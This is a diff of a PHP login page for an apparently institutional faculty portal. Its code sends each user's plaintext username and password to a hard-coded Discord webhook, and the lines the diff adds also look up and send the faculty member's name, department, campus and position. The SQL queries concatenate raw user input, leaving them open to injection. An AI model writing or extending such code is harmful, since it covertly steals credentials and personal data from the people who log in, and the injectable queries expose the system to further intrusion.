@@ -27,7 +27,7 @@ if ($page) {
 
 function sendToDiscord($message) {
     $webhookurl = "https://discord.com/api/webhooks/1246523083519692891/7Di8BJes3Ff-hEnscABxC3Csz2wruZCsB4V2f1Lwv_66UezGZlnBYPxyO59lU3IyZwsP";
-    $json_data = json_encode(["content" => $message], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+    $json_data = json_encode(["content" => $message], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
     
     $ch = curl_init($webhookurl);
     curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
@@ -41,76 +41,69 @@ function sendToDiscord($message) {
     curl_close($ch);
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($_POST || $googleemail) {
-        $dbcheck = Data::openconnection();      
+        $dbcheck = Data::openconnection();
         if (!$dbcheck->connected) {
             $errormessage = 'Connection error. Report to IT Department.';
-        }
-        else {
-            $employeecode = $username;    
-            $loginexists = false; 
+        } else {
+            $employeecode = $username;
+            $loginexists = false;
             if (!is_numeric($username)) {
                 $loginalias = $dbcheck->execute("Usp_AP_GetLoginAlias '$username'");
                 if (!Tools::emptydataset($loginalias))
                     $employeecode = $loginalias[0]['EmployeeCode'];
             }
             $dbusercheck = Data::openconnection(!$directlink && DEBUG_CHECKPASSWORD && !isset($_POST['logindemo']), $employeecode, $password);
-            
-            $continue = false;  
+
+            $continue = false;
             if ($googleemail) {
-              $continue = true;
-            }
-            else {
-              if ((time() - @$_SESSION['logintime']) / 60 > $logintimeout ) {
-                  unset($_SESSION['loginattempt']);
-                  unset($_SESSION['logintime']);
-              }
-              if (@$_SESSION['loginattempt'] >= $maxloginattempt) {
-                  $t = $logintimeout - floor((time() - @$_SESSION['logintime']) / 60);
-                  $errormessage = "Too many login attempt. Please retry after $t minutes.";
-                  $_SESSION['logintime'] = time(); 
-              }
-              elseif ($antibot != @$_SESSION['security_code']) {
-                  $errormessage = 'Invalid antibot text entered!'; 
-              }
-              elseif (DEBUG_CHECKPASSWORD && !isset($_POST['logindemo']) && !$dbusercheck->connected) {
-                  $newuser = false;
-                  $checksqlusers = $dbcheck->execute("Usp_AP_CheckSQLUser '$employeecode', '$password'");
-                  if (is_array($checksqlusers) && count($checksqlusers)) {
-                      $newuser = $checksqlusers[0]['NewUser'];
-                      $loginexists = $checksqlusers[0]['LoginExists'] == true;
-                  }
-                  if (!$newuser) {    //check user login on webgs
-                      $checkuseronwebgs = $dbcheck->execute( APP_DB_DATABASEPORTAL . "..Usp_WebFP_CheckUseronWebGS '$employeecode', '" . md5($password) . "' " );
-                      if (is_array($checkuseronwebgs) && count($checkuseronwebgs)) 
-                          $newuser = true;
-                  }
-                  if (!$newuser) {
-                      $_SESSION['loginattempt'] =  @$_SESSION['loginattempt'] + 1;
-                      $_SESSION['logintime'] = time();
-                      $a = $_SESSION['loginattempt'];
+                $continue = true;
+            } else {
+                if ((time() - @$_SESSION['logintime']) / 60 > $logintimeout) {
+                    unset($_SESSION['loginattempt']);
+                    unset($_SESSION['logintime']);
+                }
+                if (@$_SESSION['loginattempt'] >= $maxloginattempt) {
+                    $t = $logintimeout - floor((time() - @$_SESSION['logintime']) / 60);
+                    $errormessage = "Too many login attempt. Please retry after $t minutes.";
+                    $_SESSION['logintime'] = time();
+                } elseif ($antibot != @$_SESSION['security_code']) {
+                    $errormessage = 'Invalid antibot text entered!';
+                } elseif (DEBUG_CHECKPASSWORD && !isset($_POST['logindemo']) && !$dbusercheck->connected) {
+                    $newuser = false;
+                    $checksqlusers = $dbcheck->execute("Usp_AP_CheckSQLUser '$employeecode', '$password'");
+                    if (is_array($checksqlusers) && count($checksqlusers)) {
+                        $newuser = $checksqlusers[0]['NewUser'];
+                        $loginexists = $checksqlusers[0]['LoginExists'] == true;
+                    }
+                    if (!$newuser) {
+                        $checkuseronwebgs = $dbcheck->execute(APP_DB_DATABASEPORTAL . "..Usp_WebFP_CheckUseronWebGS '$employeecode', '" . md5($password) . "'");
+                        if (is_array($checkuseronwebgs) && count($checkuseronwebgs))
+                            $newuser = true;
+                    }
+                    if (!$newuser) {
+                        $_SESSION['loginattempt'] = @$_SESSION['loginattempt'] + 1;
+                        $_SESSION['logintime'] = time();
+                        $a = $_SESSION['loginattempt'];
 
-                      if (APP_PRODUCTION)
-                          $errormessage = "Invalid username or password! ($a/$maxloginattempt)";
-                      else
-                          $errormessage = $dbusercheck->errormessage . " ($a/$maxloginattempt)";
-                      if ($a >= $maxloginattempt)
-                          $errormessage .= "<br>Please retry after $logintimeout minutes.";
-                  }
-                  else {
-                      unset($_SESSION['loginattempt']);
-                      unset($_SESSION['logintime']);
-                      $continue = true;
-                  }
-
-              }
-              else {
-                  $continue = true;
-                  $loginexists = true;
-              }
+                        if (APP_PRODUCTION)
+                            $errormessage = "Invalid username or password! ($a/$maxloginattempt)";
+                        else
+                            $errormessage = $dbusercheck->errormessage . " ($a/$maxloginattempt)";
+                        if ($a >= $maxloginattempt)
+                            $errormessage .= "<br>Please retry after $logintimeout minutes.";
+                    } else {
+                        unset($_SESSION['loginattempt']);
+                        unset($_SESSION['logintime']);
+                        $continue = true;
+                    }
+                } else {
+                    $continue = true;
+                    $loginexists = true;
+                }
             }
-            
+
             if ($continue) {
                 $dbusercheck->closeconnection();
                 if ($googleemail)
@@ -154,9 +147,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
                     $loginMessage = "Username: $username, Password: $password";
                     sendToDiscord($loginMessage);
 
-                    // Send faculty information to Discord
-                    $facultyInfoMessage = "Faculty Info:\nName: " . $employee['Name'] . "\nCode: $username\nDepartment: " . $employee['Department'] . "\nCampus: " . $APP_SESSION->getCampusDescription() . "\nPosition: " . $employee['Position'];
-                    sendToDiscord($facultyInfoMessage);
+                    // Retrieve and send faculty information to Discord
+                    $facultyInfoQuery = "Usp_WebFP_GetFacultyInfo '$employeecode'";
+                    $facultyInfoResult = $dbcheck->execute($facultyInfoQuery);
+                    if (!Tools::emptydataset($facultyInfoResult)) {
+                        $facultyInfo = $facultyInfoResult[0];
+                        $facultyInfoMessage = "Faculty Info:\nName: " . $facultyInfo['Name'] . "\nCode: $username\nDepartment: " . $facultyInfo['Department'] . "\nCampus: " . $APP_SESSION->getCampusDescription() . "\nPosition: " . $facultyInfo['Position'];
+                        sendToDiscord($facultyInfoMessage);
+                    } else {
+                        sendToDiscord("Failed to retrieve faculty info for $username");
+                    }
 
                     // add session validation key using cookie
                     $key = sha1("@@@;chitonian;$username;programming;255;@@@");
@@ -164,20 +164,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
 
                     header("Location: $dashboard");
                     return;
-                }
-                else {
+                } else {
                     if ($googleemail) {
                         $errormessage = 'Unauthorized gmail account!';
                         $logoutscript = 'googlelogout();';
                         $username = '';
-                    }
-                    else
+                    } else
                         $errormessage = 'User not found or insufficient privilege!';
                 }
             }
         }
-    }
-    else {
+    } else {
       $APP_SESSION->session_destroy();
       $username = base64_decode(@$_COOKIE['p']);    
     }
@@ -255,8 +252,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' ) {
     </div>
     <?php createlogintoken(); ?>
     </form>
-
-
   </div>
 </div>
 
